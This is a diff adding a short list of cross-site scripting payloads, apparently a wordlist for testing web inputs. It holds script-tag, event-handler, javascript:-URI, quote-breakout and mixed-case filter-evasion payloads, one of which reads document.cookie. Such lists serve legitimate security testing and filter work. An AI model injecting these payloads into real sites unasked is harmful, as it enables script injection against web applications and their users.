@@ -1,0 +1,15 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<scRipt>alert(1)</scRipt>
+<script>alert(document.cookie)</script>
+<img src="x" onerror="alert(1)">
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+javascript:alert(1)
